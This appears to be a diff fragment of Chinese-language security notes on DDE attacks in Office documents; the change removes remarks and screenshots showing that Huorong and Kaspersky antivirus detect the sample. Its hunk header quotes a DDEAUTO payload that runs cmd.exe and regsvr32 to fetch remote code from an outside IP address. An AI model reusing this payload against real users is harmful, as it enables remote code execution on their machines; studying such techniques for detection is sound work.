@@ -173,16 +173,6 @@ DDEAUTO c:\\windows\\system32\\cmd.exe "/k regsvr32 /s /n /u /i:http://100.1.1.1
 
 ![image-20240606175736169](http://cdn.ayusummer233.top/DailyNotes/202406061758785.png)
 
-火绒可检出:
-
-![image-20240606160105265](http://cdn.ayusummer233.top/DailyNotes/202406061624984.png)
-
-卡巴可检出:
-
-![image-20240606160926908](http://cdn.ayusummer233.top/DailyNotes/202406061624353.png)
-
-![image-20240606161518095](http://cdn.ayusummer233.top/DailyNotes/202406061624285.png)
-
 ---
 
 ## 相关链接
